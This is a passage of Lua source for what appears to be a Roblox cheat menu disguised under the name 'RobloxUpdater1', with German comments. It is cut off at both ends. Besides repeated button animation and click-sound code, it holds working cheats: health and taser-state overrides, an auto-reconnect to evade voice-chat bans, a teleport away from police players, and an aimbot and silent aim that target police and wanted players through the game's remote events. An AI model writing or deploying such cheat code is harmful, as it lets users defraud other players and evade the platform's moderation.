	-- Verbindung der Maus-Ereignisse
	button.MouseEnter:Connect(onMouseEnter)
	button.MouseLeave:Connect(onMouseLeave)
	
end
task.spawn(SCRIPT_1ad)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.MAIN.ScrollingFrame1.3AntiFall.Click Sound \\ --
local function SCRIPT_1af()
local script = UI["1af"]
	function Click(mouse)
	
		local sound = Instance.new("Sound")
		sound.SoundId = "rbxassetid://876939830"
		sound.Looped = false
		sound.Parent = workspace
		sound:Play()
	
	end
	
	script.Parent.MouseButton1Down:connect(Click)
end
task.spawn(SCRIPT_1af)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.MAIN.ScrollingFrame1.4AntiDowned.LocalScript \\ --
local function SCRIPT_1b6()
local script = UI["1b6"]
	local Players = game:GetService("Players")
	local LocalPlayer = Players.LocalPlayer
	local button = script.Parent  -- Verweis auf den TextButton
	local isAntiDownedActive = false  -- Zustand des Anti Downed Mechanismus
	local connection
	
	-- Funktion, um den Anti Downed Mechanismus zu aktivieren/deaktivieren
	local function toggleAntiDowned()
		isAntiDownedActive = not isAntiDownedActive  -- Zustand umkehren
	
		if isAntiDownedActive then
			-- Aktiviere Anti Downed
			connection = LocalPlayer.Character.Humanoid:GetPropertyChangedSignal("Health"):Connect(function()
				LocalPlayer.Character.Humanoid.Health = 100  -- Setze Gesundheit zurÃ¼ck
			end)
			button.Text = "Anti Downed: ON"  -- Button-Text aktualisieren
			print("Anti Downed: ON")
		else
			-- Deaktiviere Anti Downed
			if connection then
				connection:Disconnect()  -- Verbindung trennen
				connection = nil
			end
			button.Text = "Anti Downed: OFF"  -- Button-Text aktualisieren
			print("Anti Downed: OFF")
		end
	end
	
	-- Button Click-Event verbinden
	button.MouseButton1Click:Connect(toggleAntiDowned)
	
	-- Button-Text beim Start setzen
	button.Text = "Anti Downed: OFF"  -- Initialen Button-Text setzen
	
end
task.spawn(SCRIPT_1b6)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.MAIN.ScrollingFrame1.4AntiDowned.animation \\ --
local function SCRIPT_1b7()
local script = UI["1b7"]
	local button = script.Parent
	local TweenService = game:GetService("TweenService")
	
	-- Definiere die Animation (Tween)
	local tweenInfo = TweenInfo.new(
		0.2, -- Zeit in Sekunden (kÃ¼rzer fÃ¼r schnellere Animation)
		Enum.EasingStyle.Quad, -- Easing-Stil
		Enum.EasingDirection.Out -- Easing-Richtung
	)
	
	local goalHover = {
		Position = UDim2.new(button.Position.X.Scale, button.Position.X.Offset, button.Position.Y.Scale - 0.03, button.Position.Y.Offset) -- Button um 5% nach oben bewegen
	}
	
	local goalNormal = {
		Position = UDim2.new(button.Position.X.Scale, button.Position.X.Offset, button.Position.Y.Scale, button.Position.Y.Offset) -- UrsprÃ¼ngliche Position zurÃ¼cksetzen
	}
	
	-- Funktion, um die Animation zu starten
	local function onMouseEnter()
		TweenService:Create(button, tweenInfo, goalHover):Play() -- Starte die Hover-Animation
	end
	
	-- Funktion, um die Animation zu stoppen
	local function onMouseLeave()
		TweenService:Create(button, tweenInfo, goalNormal):Play() -- Setze die Position zurÃ¼ck
	end
	
	-- Verbindung der Maus-Ereignisse
	button.MouseEnter:Connect(onMouseEnter)
	button.MouseLeave:Connect(onMouseLeave)
	
end
task.spawn(SCRIPT_1b7)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.MAIN.ScrollingFrame1.4AntiDowned.Click Sound \\ --
local function SCRIPT_1b9()
local script = UI["1b9"]
	function Click(mouse)
	
		local sound = Instance.new("Sound")
		sound.SoundId = "rbxassetid://876939830"
		sound.Looped = false
		sound.Parent = workspace
		sound:Play()
	
	end
	
	script.Parent.MouseButton1Down:connect(Click)
end
task.spawn(SCRIPT_1b9)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.MAIN.ScrollingFrame2.AntiTaser.LocalScript \\ --
local function SCRIPT_1bf()
local script = UI["1bf"]
	local button = script.Parent  
	local monitoringActive = false  
	
	local qqvConnection = nil
	local childConnection = nil
	local antiTaser = false
	local antiTaserTask
	
	local function toggleMonitoring()
		if monitoringActive then
			monitoringActive = not monitoringActive
			button.Text = "Anti Taser: OFF"
			antiTaser = false
		else
			antiTaser = true
			monitoringActive = not monitoringActive
			button.Text = "Anti Taser: ON"
			antiTaserTask = task.spawn(function()
				if not game.Players.LocalPlayer.Character:GetAttribute("Tased") then
					game.Players.LocalPlayer.Character:SetAttribute("Tased", false)
				else 
					game.Players.LocalPlayer.Character:SetAttribute("Tased", false)
				end
				game.Players.LocalPlayer.Character:GetAttributeChangedSignal("Tased"):Connect(function()
					if antiTaser then
						game.Players.LocalPlayer.Character:SetAttribute("Tased", false)
					end
				end)
			end)
		end
	end
	
	button.Text = "Anti Taser: OFF"
	button.MouseButton1Click:Connect(toggleMonitoring)
	
end
task.spawn(SCRIPT_1bf)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.MAIN.ScrollingFrame2.AntiTaser.animation \\ --
local function SCRIPT_1c1()
local script = UI["1c1"]
	local button = script.Parent
	local TweenService = game:GetService("TweenService")
	
	-- Definiere die Animation (Tween)
	local tweenInfo = TweenInfo.new(
		0.2, -- Zeit in Sekunden (kÃ¼rzer fÃ¼r schnellere Animation)
		Enum.EasingStyle.Quad, -- Easing-Stil
		Enum.EasingDirection.Out -- Easing-Richtung
	)
	
	local goalHover = {
		Position = UDim2.new(button.Position.X.Scale, button.Position.X.Offset, button.Position.Y.Scale - 0.03, button.Position.Y.Offset) -- Button um 5% nach oben bewegen
	}
	
	local goalNormal = {
		Position = UDim2.new(button.Position.X.Scale, button.Position.X.Offset, button.Position.Y.Scale, button.Position.Y.Offset) -- UrsprÃ¼ngliche Position zurÃ¼cksetzen
	}
	
	-- Funktion, um die Animation zu starten
	local function onMouseEnter()
		TweenService:Create(button, tweenInfo, goalHover):Play() -- Starte die Hover-Animation
	end
	
	-- Funktion, um die Animation zu stoppen
	local function onMouseLeave()
		TweenService:Create(button, tweenInfo, goalNormal):Play() -- Setze die Position zurÃ¼ck
	end
	
	-- Verbindung der Maus-Ereignisse
	button.MouseEnter:Connect(onMouseEnter)
	button.MouseLeave:Connect(onMouseLeave)
	
end
task.spawn(SCRIPT_1c1)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.MAIN.ScrollingFrame2.AntiTaser.Click Sound \\ --
local function SCRIPT_1c3()
local script = UI["1c3"]
	function Click(mouse)
	
		local sound = Instance.new("Sound")
		sound.SoundId = "rbxassetid://876939830"
		sound.Looped = false
		sound.Parent = workspace
		sound:Play()
	
	end
	
	script.Parent.MouseButton1Down:connect(Click)
end
task.spawn(SCRIPT_1c3)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.MAIN.ScrollingFrame2.AntiVCBan.LocalScript \\ --
local function SCRIPT_1c7()
local script = UI["1c7"]
	-- Hole den VoiceChatService
	local voiceChatService = game:GetService("VoiceChatService")
	local player = game.Players.LocalPlayer
	local button = script.Parent.Parent.AntiVCBan  -- Button-Referenz
	
	local isVoiceChatEnabled = false
	local reconnectTimer = 5  -- Sekunden bis zum erneuten Verbinden
	
	-- Funktion zum Aktivieren/Deaktivieren von Voice-Chat
	local function toggleVoiceChat()
		isVoiceChatEnabled = not isVoiceChatEnabled  -- Umschalten des Status
	
		if isVoiceChatEnabled then
			-- Voice-Chat aktivieren und alle 5 Sekunden erneut verbinden
			voiceChatService:joinVoice()
			button.Text = "Anti VC Ban: ON"
	
			-- Alle 5 Sekunden die Verbindung neu herstellen, solange Voice-Chat aktiv ist
			while isVoiceChatEnabled do
				wait(reconnectTimer)
				if voiceChatService and not voiceChatService:IsVoiceConnected() then
					voiceChatService:joinVoice()  -- Erneut verbinden
				end
			end
		else
			-- Voice-Chat deaktivieren
			voiceChatService:leaveVoice()
			button.Text = "Anti VC Ban: OFF"
		end
	end
	
	-- Button-Klick-Event verbinden
	button.MouseButton1Click:Connect(toggleVoiceChat)
	
end
task.spawn(SCRIPT_1c7)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.MAIN.ScrollingFrame2.AntiVCBan.animation \\ --
local function SCRIPT_1c9()
local script = UI["1c9"]
	local button = script.Parent
	local TweenService = game:GetService("TweenService")
	
	-- Definiere die Animation (Tween)
	local tweenInfo = TweenInfo.new(
		0.2, -- Zeit in Sekunden (kÃ¼rzer fÃ¼r schnellere Animation)
		Enum.EasingStyle.Quad, -- Easing-Stil
		Enum.EasingDirection.Out -- Easing-Richtung
	)
	
	local goalHover = {
		Position = UDim2.new(button.Position.X.Scale, button.Position.X.Offset, button.Position.Y.Scale - 0.03, button.Position.Y.Offset) -- Button um 5% nach oben bewegen
	}
	
	local goalNormal = {
		Position = UDim2.new(button.Position.X.Scale, button.Position.X.Offset, button.Position.Y.Scale, button.Position.Y.Offset) -- UrsprÃ¼ngliche Position zurÃ¼cksetzen
	}
	
	-- Funktion, um die Animation zu starten
	local function onMouseEnter()
		TweenService:Create(button, tweenInfo, goalHover):Play() -- Starte die Hover-Animation
	end
	
	-- Funktion, um die Animation zu stoppen
	local function onMouseLeave()
		TweenService:Create(button, tweenInfo, goalNormal):Play() -- Setze die Position zurÃ¼ck
	end
	
	-- Verbindung der Maus-Ereignisse
	button.MouseEnter:Connect(onMouseEnter)
	button.MouseLeave:Connect(onMouseLeave)
	
end
task.spawn(SCRIPT_1c9)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.MAIN.ScrollingFrame2.AntiVCBan.Click Sound \\ --
local function SCRIPT_1cb()
local script = UI["1cb"]
	function Click(mouse)
	
		local sound = Instance.new("Sound")
		sound.SoundId = "rbxassetid://876939830"
		sound.Looped = false
		sound.Parent = workspace
		sound:Play()
	
	end
	
	script.Parent.MouseButton1Down:connect(Click)
end
task.spawn(SCRIPT_1cb)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.MAIN.ScrollingFrame2.AntiArrest.LocalScript \\ --
local function SCRIPT_1cf()
local script = UI["1cf"]
	local player = game:GetService("Players").LocalPlayer
	local character = player.Character or player.CharacterAdded:Wait()
	local rootPart = character:WaitForChild("HumanoidRootPart")
	local raycastParams = RaycastParams.new()
	raycastParams.FilterDescendantsInstances = {character}
	raycastParams.FilterType = Enum.RaycastFilterType.Blacklist
	
	local AntiArrestToggle = false
	
	local function isPositionSafe(position)
		-- ÃœberprÃ¼fe, ob die Position in einem soliden Objekt ist
		local region = Region3.new(position - Vector3.new(1,1,1), position + Vector3.new(1,1,1))
		local parts = workspace:FindPartsInRegion3(region, character, 100)
	
		for _, part in ipairs(parts) do
			if part.CanCollide then
				return false
			end
		end
		return true
	end
	
	local function findSafeTeleportPosition(fromPosition, awayFromPosition)
		local directions = {
			Vector3.new(1, 0, 0),   -- Rechts
			Vector3.new(-1, 0, 0),  -- Links
			Vector3.new(0, 0, 1),    -- VorwÃ¤rts
			Vector3.new(0, 0, -1),   -- RÃ¼ckwÃ¤rts
			Vector3.new(0, 1, 0),    -- Oben
			Vector3.new(0, -1, 0),   -- Unten
			Vector3.new(1, 1, 0).Unit,    -- Diagonal oben rechts
			Vector3.new(-1, 1, 0).Unit,   -- Diagonal oben links
			Vector3.new(0, 1, 1).Unit,    -- Diagonal oben vorwÃ¤rts
			Vector3.new(0, 1, -1).Unit    -- Diagonal oben rÃ¼ckwÃ¤rts
		}
	
		-- Priorisiere zuerst die direkte Fluchtrichtung
		local baseDirection = (fromPosition - awayFromPosition).Unit
		table.insert(directions, 1, baseDirection)
	
		for _, dir in ipairs(directions) do
			local testPosition = fromPosition + (dir * 8)
	
			-- Raycast zur neuen Position
			local ray = workspace:Raycast(fromPosition, dir * 8, raycastParams)
	
			-- Wenn kein Hindernis oder nicht kollidierbar
			if not ray or (ray.Instance and not ray.Instance.CanCollide) then
				-- ZusÃ¤tzliche ÃœberprÃ¼fung der Zielposition
				if isPositionSafe(testPosition) then
					return testPosition
				end
			end
		end
	
		-- Fallback: Leicht nach oben teleportieren
		return fromPosition + Vector3.new(0, 5, 0)
	end
	
	local function checkPolicePlayers()
		while true do
			task.wait(0.1)
			if AntiArrestToggle then
				if not character or not rootPart then
					character = player.Character
					if character then
						rootPart = character:FindFirstChild("HumanoidRootPart")
						raycastParams.FilterDescendantsInstances = {character}
					end
					if not rootPart then continue end
				end
				if not game.Players.LocalPlayer.Character.Humanoid.Sit then
					for _, otherPlayer in ipairs(game:GetService("Players"):GetPlayers()) do
						if otherPlayer ~= player and otherPlayer.Team and otherPlayer.Team.Name:lower() == "police" then
							local otherCharacter = otherPlayer.Character
							if otherCharacter then
								local otherRoot = otherCharacter:FindFirstChild("HumanoidRootPart")
								if otherRoot then
									local distance = (otherRoot.Position - rootPart.Position).Magnitude
									if distance <= 10 then
										-- Finde eine sichere Position
										local safePosition = findSafeTeleportPosition(rootPart.Position, otherRoot.Position)
	
										-- Sofortige Teleportation
										rootPart.CFrame = CFrame.new(safePosition)
	
										-- Optional: Benachrichtigung
										game:GetService("StarterGui"):SetCore("SendNotification", {
											Title = "Teleportiert!",
											Text = "Police-Spieler zu nah - sichere Position gewÃ¤hlt",
											Duration = 2
										})
									end
								end
							end
						end
					end
				end
			end
		end
	end
	
	script.Parent.MouseButton1Up:Connect(function()
		AntiArrestToggle = not AntiArrestToggle
		
		if AntiArrestToggle then
			script.Parent.Text = "Anti Arrest: ON"
		else
			script.Parent.Text = "Anti Arrest: OFF"	
		end
	end)
	
	-- Starte die ÃœberprÃ¼fung
	checkPolicePlayers()
end
task.spawn(SCRIPT_1cf)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.MAIN.ScrollingFrame2.AntiArrest.animation \\ --
local function SCRIPT_1d1()
local script = UI["1d1"]
	local button = script.Parent
	local TweenService = game:GetService("TweenService")
	
	-- Definiere die Animation (Tween)
	local tweenInfo = TweenInfo.new(
		0.2, -- Zeit in Sekunden (kÃ¼rzer fÃ¼r schnellere Animation)
		Enum.EasingStyle.Quad, -- Easing-Stil
		Enum.EasingDirection.Out -- Easing-Richtung
	)
	
	local goalHover = {
		Position = UDim2.new(button.Position.X.Scale, button.Position.X.Offset, button.Position.Y.Scale - 0.03, button.Position.Y.Offset) -- Button um 5% nach oben bewegen
	}
	
	local goalNormal = {
		Position = UDim2.new(button.Position.X.Scale, button.Position.X.Offset, button.Position.Y.Scale, button.Position.Y.Offset) -- UrsprÃ¼ngliche Position zurÃ¼cksetzen
	}
	
	-- Funktion, um die Animation zu starten
	local function onMouseEnter()
		TweenService:Create(button, tweenInfo, goalHover):Play() -- Starte die Hover-Animation
	end
	
	-- Funktion, um die Animation zu stoppen
	local function onMouseLeave()
		TweenService:Create(button, tweenInfo, goalNormal):Play() -- Setze die Position zurÃ¼ck
	end
	
	-- Verbindung der Maus-Ereignisse
	button.MouseEnter:Connect(onMouseEnter)
	button.MouseLeave:Connect(onMouseLeave)
	
end
task.spawn(SCRIPT_1d1)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.MAIN.ScrollingFrame2.AntiArrest.Click Sound \\ --
local function SCRIPT_1d3()
local script = UI["1d3"]
	function Click(mouse)
	
		local sound = Instance.new("Sound")
		sound.SoundId = "rbxassetid://876939830"
		sound.Looped = false
		sound.Parent = workspace
		sound:Play()
	
	end
	
	script.Parent.MouseButton1Down:connect(Click)
end
task.spawn(SCRIPT_1d3)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.Aimbot.Aimbot.AimbotScript \\ --
local function SCRIPT_1dd()
local script = UI["1dd"]
	local aim_config = _G.JALON_AIMCONFIG or {
		Enabled = false,
		KeyActivation = Enum.UserInputType.MouseButton2, -- Rechtsklick
		CloseKey = Enum.KeyCode[script.Parent.Parent.Parent.Parent.Settings:GetAttribute("AimBotKey")], -- SchlieÃŸen mit "L"
		FOV = 153,
		TeamCheck = false,
		DistanceCheck = true,
		VisibleCheck = true,
		LockDistance = 450,
	
		Smoothness = 0.975,
		Prediction = {
			Enabled = true,
			Value = 0.185
		},
	
		-- Police wurde entfernt, damit der Aimbot auf sie zielt
		IgnoredTeams = { "ADAC", "BusCompany", "FireDepartment", "Prisoner", "TruckCompany" }
	}
	_G.JALON_AIMCONFIG = aim_config
	
	local TARGETPART = "Head"
	local wantedRemoteEvent = game:GetService("ReplicatedStorage")["ZDD"]["a3581179-8ba7-43e9-930f-ce588a96c919"]
	local Players = game:GetService("Players")
	local wantedPlayers = {}
	
	-- Services
	local input_service = game:GetService("UserInputService")
	local run_service = game:GetService("RunService")
	local starterGui = game:GetService("StarterGui")
	
	-- Objekte
	local camera = workspace.CurrentCamera
	local player = Players.LocalPlayer
	local humanoid = player.Character and player.Character:FindFirstChildOfClass("Humanoid")
	
	local fovCircle = Drawing.new("Circle")
	
	-- FOV-Kreis einstellen
	fovCircle.Color = Color3.fromRGB(0, 178, 255)
	fovCircle.Thickness = 2
	fovCircle.Transparency = 0.6
	fovCircle.Visible = true
	
	-- Variablen
	local current_nearest_plr
	local aim_enabled = false
	
	-- Wanted-Liste aktualisieren
	wantedRemoteEvent.OnClientEvent:Connect(function(eventData)
		if typeof(eventData) == "table" then
			wantedPlayers = table.clone(eventData)
		end
	end)
	
	-- Spieler-Validierung (ANGEPASST: Zielt auf Wanted + Police)
	local function is_player_valid(plrArg)
		-- Ziele auf Wanted-Spieler ODER Police-Team (auch wenn nicht wanted)
		local isWanted = wantedPlayers[plrArg.Name]
		local isPolice = tostring(plrArg.Team) == "Police"
	
		if not (isWanted or isPolice) then
			return false
		end
	
		-- Ignoriere andere Teams (ADAC, FireDepartment, etc.), aber nicht Police
		if table.find(aim_config.IgnoredTeams, tostring(plrArg.Team)) and not isPolice then
			return false
		end
	
		local plrChar = plrArg.Character
		local plrHumanoid, target_part = (plrChar and plrChar:FindFirstChildWhichIsA("Humanoid")), (plrChar and plrChar:FindFirstChild(TARGETPART))
	
		if not (plrArg ~= player and plrChar and plrHumanoid and target_part and plrHumanoid.Health > 0) then
			return false
		end
	
		-- Spieler ignorieren, wenn weniger als 25% HP
		if (plrHumanoid.Health / plrHumanoid.MaxHealth) < 0.25 then
			return false
		end
	
		if plrChar:FindFirstChildWhichIsA("ForceField") then
			return false
		end
	
		return true, target_part
	end
	
	-- NÃ¤chsten Spieler finden (unverÃ¤ndert)
	local function get_nearest_player()
		local nearest_plr_data = {aimPart = nil, cursor_dist = math.huge, char_dist = math.huge}
	
		for _, plr in Players:GetPlayers() do
			local passed, target_part = is_player_valid(plr)
			if not (passed and target_part) then continue end
	
			local screen_pos, on_screen = camera:WorldToViewportPoint(target_part.Position)
			local fov_dist = (input_service:GetMouseLocation() - Vector2.new(screen_pos.X, screen_pos.Y)).Magnitude
			local char_dist = math.huge
			if target_part and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
				char_dist = (player.Character.HumanoidRootPart.Position - target_part.Position).Magnitude
			end
	
			if char_dist <= aim_config.LockDistance then
				if ((fov_dist <= aim_config.FOV) and (fov_dist < nearest_plr_data.cursor_dist)) then
					nearest_plr_data.aimPart = target_part
					nearest_plr_data.cursor_dist = fov_dist
					nearest_plr_data.char_dist = char_dist
				end
			end
		end
		return nearest_plr_data.aimPart and nearest_plr_data or nil
	end
	
	-- Rest des Skripts (unverÃ¤ndert)
	run_service.PreSimulation:Connect(function()
		if not aim_enabled then 
			fovCircle.Visible = false
			return 
		end
	
		fovCircle.Visible = true
		fovCircle.Radius = aim_config.FOV
		fovCircle.Position = input_service:GetMouseLocation()
	
		current_nearest_plr = get_nearest_player()
	
		if current_nearest_plr then
			local screen_pos, on_screen = camera:WorldToViewportPoint(current_nearest_plr.aimPart.Position)
	
			if input_service:IsMouseButtonPressed(aim_config.KeyActivation) then
				local target_position = (aim_config.Prediction.Enabled and current_nearest_plr.aimPart.Position + current_nearest_plr.aimPart.Velocity * aim_config.Prediction.Value) or current_nearest_plr.aimPart.Position
				local horizontal_look = CFrame.lookAt(camera.CFrame.Position, target_position)
	
				camera.CFrame = camera.CFrame:Lerp(horizontal_look, aim_config.Smoothness)
			end
		end
	end)
	
	input_service.InputBegan:Connect(function(input)
		if input.KeyCode == Enum.KeyCode[script.Parent.Parent.Parent.Parent.Settings:GetAttribute("AimBotKey")] then
			aim_enabled = not aim_enabled
			fovCircle.Visible = aim_enabled
		end
	end)
	
	script.Parent.MouseButton1Up:Connect(function()
		aim_enabled = not aim_enabled
		fovCircle.Visible = aim_enabled
	end)
	
	script.Parent.Parent["Toggle PartAim"].MouseButton1Up:Connect(function()
		if TARGETPART == "Head" then
			TARGETPART = "HumanoidRootPart"
			script.Parent.Parent["Toggle PartAim"].Text = "Torso"
		else
			TARGETPART = "Head"
			script.Parent.Parent["Toggle PartAim"].Text = "Head"
		end
	end)
end
task.spawn(SCRIPT_1dd)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.Aimbot.Aimbot.animation \\ --
local function SCRIPT_1de()
local script = UI["1de"]
	local button = script.Parent
	local TweenService = game:GetService("TweenService")
	
	-- Definiere die Animation (Tween)
	local tweenInfo = TweenInfo.new(
		0.2, -- Zeit in Sekunden (kÃ¼rzer fÃ¼r schnellere Animation)
		Enum.EasingStyle.Quad, -- Easing-Stil
		Enum.EasingDirection.Out -- Easing-Richtung
	)
	
	local goalHover = {
		Position = UDim2.new(button.Position.X.Scale, button.Position.X.Offset, button.Position.Y.Scale - 0.03, button.Position.Y.Offset) -- Button um 5% nach oben bewegen
	}
	
	local goalNormal = {
		Position = UDim2.new(button.Position.X.Scale, button.Position.X.Offset, button.Position.Y.Scale, button.Position.Y.Offset) -- UrsprÃ¼ngliche Position zurÃ¼cksetzen
	}
	
	-- Funktion, um die Animation zu starten
	local function onMouseEnter()
		TweenService:Create(button, tweenInfo, goalHover):Play() -- Starte die Hover-Animation
	end
	
	-- Funktion, um die Animation zu stoppen
	local function onMouseLeave()
		TweenService:Create(button, tweenInfo, goalNormal):Play() -- Setze die Position zurÃ¼ck
	end
	
	-- Verbindung der Maus-Ereignisse
	button.MouseEnter:Connect(onMouseEnter)
	button.MouseLeave:Connect(onMouseLeave)
	
end
task.spawn(SCRIPT_1de)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.Aimbot.Toggle PartAim.animation \\ --
local function SCRIPT_1e7()
local script = UI["1e7"]
	local button = script.Parent
	local TweenService = game:GetService("TweenService")
	
	-- Definiere die Animation (Tween)
	local tweenInfo = TweenInfo.new(
		0.2, -- Zeit in Sekunden (kÃ¼rzer fÃ¼r schnellere Animation)
		Enum.EasingStyle.Quad, -- Easing-Stil
		Enum.EasingDirection.Out -- Easing-Richtung
	)
	
	local goalHover = {
		Position = UDim2.new(button.Position.X.Scale, button.Position.X.Offset, button.Position.Y.Scale - 0.03, button.Position.Y.Offset) -- Button um 5% nach oben bewegen
	}
	
	local goalNormal = {
		Position = UDim2.new(button.Position.X.Scale, button.Position.X.Offset, button.Position.Y.Scale, button.Position.Y.Offset) -- UrsprÃ¼ngliche Position zurÃ¼cksetzen
	}
	
	-- Funktion, um die Animation zu starten
	local function onMouseEnter()
		TweenService:Create(button, tweenInfo, goalHover):Play() -- Starte die Hover-Animation
	end
	
	-- Funktion, um die Animation zu stoppen
	local function onMouseLeave()
		TweenService:Create(button, tweenInfo, goalNormal):Play() -- Setze die Position zurÃ¼ck
	end
	
	-- Verbindung der Maus-Ereignisse
	button.MouseEnter:Connect(onMouseEnter)
	button.MouseLeave:Connect(onMouseLeave)
	
end
task.spawn(SCRIPT_1e7)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.Aimbot.ScrollingFrame1.2Toggle PartSilent.animation \\ --
local function SCRIPT_1f1()
local script = UI["1f1"]
	local button = script.Parent
	local TweenService = game:GetService("TweenService")
	
	-- Definiere die Animation (Tween)
	local tweenInfo = TweenInfo.new(
		0.2, -- Zeit in Sekunden (kÃ¼rzer fÃ¼r schnellere Animation)
		Enum.EasingStyle.Quad, -- Easing-Stil
		Enum.EasingDirection.Out -- Easing-Richtung
	)
	
	local goalHover = {
		Position = UDim2.new(button.Position.X.Scale, button.Position.X.Offset, button.Position.Y.Scale - 0.03, button.Position.Y.Offset) -- Button um 5% nach oben bewegen
	}
	
	local goalNormal = {
		Position = UDim2.new(button.Position.X.Scale, button.Position.X.Offset, button.Position.Y.Scale, button.Position.Y.Offset) -- UrsprÃ¼ngliche Position zurÃ¼cksetzen
	}
	
	-- Funktion, um die Animation zu starten
	local function onMouseEnter()
		TweenService:Create(button, tweenInfo, goalHover):Play() -- Starte die Hover-Animation
	end
	
	-- Funktion, um die Animation zu stoppen
	local function onMouseLeave()
		TweenService:Create(button, tweenInfo, goalNormal):Play() -- Setze die Position zurÃ¼ck
	end
	
	-- Verbindung der Maus-Ereignisse
	button.MouseEnter:Connect(onMouseEnter)
	button.MouseLeave:Connect(onMouseLeave)
	
end
task.spawn(SCRIPT_1f1)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.Aimbot.ScrollingFrame1.1SilentAim.SilentAimScript \\ --
local function SCRIPT_1f7()
local script = UI["1f7"]
	-- âš™ï¸ Aim-Konfiguration (mit Wanted-Check)
	local default_config = {
		Enabled = false,
		CloseKey = Enum.KeyCode[script.Parent.Parent.Parent.Parent.Parent.Settings:GetAttribute("SilentAimKey")],
	
		FOV = 139,
		DistanceCheck = true,
		VisibleCheck = true,
	
		Smoothness = 0.975,
		Prediction = {
			Enabled = true,
			Value = 0.185
		},
	
		IgnoredTeams = {"ADAC","BusCompany","FireDepartment","Prisoner","TruckCompany"} 
	}
	
	_G.JALON_AIMCONFIG = default_config
	
	local aim_config = _G.JALON_AIMCONFIG
	local TARGETPART = "Head"
	
	-- ðŸ”Œ Services
	local input_service = game:GetService("UserInputService")
	local players = game:GetService("Players")
	local run_service = game:GetService("RunService")
	local camera = workspace.CurrentCamera
	local player = players.LocalPlayer
	
	-- Wanted-System und Shoot-Event
	local wantedRemoteEvent = game:GetService("ReplicatedStorage")["ZDD"]["a3581179-8ba7-43e9-930f-ce588a96c919"]
	local shootRemoteEvent = game:GetService("ReplicatedStorage")["ZDD"]["0b6c4b19-e763-4590-b964-bbfc01b63348"]
	local wantedPlayers = {}
	
	-- ðŸŽ¯ FOV-Kreis
	local fovCircle = Drawing.new("Circle")
	fovCircle.Color = Color3.fromRGB(255, 0, 0)
	fovCircle.Thickness = 2
	fovCircle.Transparency = 0.6
	fovCircle.Visible = false
	
	-- ðŸ” Variablen
	local aim_enabled = false
	local current_nearest_plr = nil
	
	-- Wanted-Update
	wantedRemoteEvent.OnClientEvent:Connect(function(eventData)
		if typeof(eventData) == "table" then
			wantedPlayers = table.clone(eventData)
		end
	end)
	
	-- âœ… SpielerprÃ¼fung (mit TeamCheck und Wanted-Check)
	local function is_player_valid(plrArg)
		-- IgnoredTeams Check
		if table.find(aim_config.IgnoredTeams, tostring(plrArg.Team)) then
			return false
		end
	
		-- Wanted-Check fÃ¼r Citizen (nur Citizen mit wanted status zielen)
		if plrArg.Team and plrArg.Team.Name == "Citizen" and not wantedPlayers[plrArg.Name] then
			return false
		end
	
		local plrChar = plrArg.Character
		local plrHumanoid = plrChar and plrChar:FindFirstChildWhichIsA("Humanoid")
		local target_part = plrChar and plrChar:FindFirstChild(TARGETPART)
	
		if plrHumanoid and plrHumanoid.Health / plrHumanoid.MaxHealth < 0.25 then
			return false
		end
	
		local is_valid = plrArg ~= player and plrChar and plrHumanoid and plrHumanoid.Health > 0 and not plrChar:FindFirstChildWhichIsA("ForceField")
		return is_valid, target_part
	end
	
	local function get_rootpart(plr)
		return plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") or nil
	end
	
	local function in_line_of_sight(origin_pos, ...)
		return #camera:GetPartsObscuringTarget({origin_pos}, {camera, player.Character, ...}) == 0
	end
	
	local function get_vel_prediction(velocity)
		return Vector3.new(velocity.X, math.clamp((velocity.Y * 0.5), -5, 10), velocity.Z)
	end
	
	local function get_camera_prediction(predicting_part)
		return predicting_part.CFrame + get_vel_prediction(predicting_part.Velocity) * aim_config.Prediction.Value
	end
	
	local function get_nearest_player()
		local nearest_plr_data = {aimPart = nil, cursor_dist = math.huge, char_dist = math.huge}
	
		for _, plr in pairs(players:GetPlayers()) do
			local passed, target_part = is_player_valid(plr)
			if not (passed and target_part) then continue end
	
			local screen_pos, on_screen = camera:WorldToViewportPoint(target_part.Position)
			local fov_dist = (input_service:GetMouseLocation() - Vector2.new(screen_pos.X, screen_pos.Y)).Magnitude
			local char_dist = (get_rootpart(player).Position - target_part.Position).Magnitude
	
			if (not aim_config.VisibleCheck or (on_screen and in_line_of_sight(camera.CFrame, plr.Character))) then
				if (fov_dist <= aim_config.FOV and fov_dist < nearest_plr_data.cursor_dist) and (not aim_config.DistanceCheck or char_dist < nearest_plr_data.char_dist) then
					nearest_plr_data.aimPart = target_part
					nearest_plr_data.cursor_dist = fov_dist
					nearest_plr_data.char_dist = char_dist
				end
			end
		end
	
		return nearest_plr_data.aimPart and nearest_plr_data or nil
	end
	
	-- ðŸŽ® Taste zum Aktivieren
	input_service.InputBegan:Connect(function(input)
		if input.KeyCode == Enum.KeyCode[script.Parent.Parent.Parent.Parent.Parent.Settings:GetAttribute("SilentAimKey")] then
			aim_enabled = not aim_enabled
			fovCircle.Visible = aim_enabled
		end
	end)
	
	-- ðŸ§  Zielverfolgung und Shooting
	run_service.RenderStepped:Connect(function()
		if not aim_enabled then
			fovCircle.Visible = false
			return
		end
	
		fovCircle.Radius = aim_config.FOV
		fovCircle.Position = input_service:GetMouseLocation()
	
		current_nearest_plr = get_nearest_player()
	
		if current_nearest_plr then
			local target_part = current_nearest_plr.aimPart
			local target_position = aim_config.Prediction.Enabled and get_camera_prediction(target_part) or target_part
			local screen_pos, on_screen = camera:WorldToViewportPoint(target_part.Position)
			local is_visible = on_screen and in_line_of_sight(camera.CFrame, players:GetPlayerFromCharacter(target_part.Parent).Character)
	
			if is_visible then
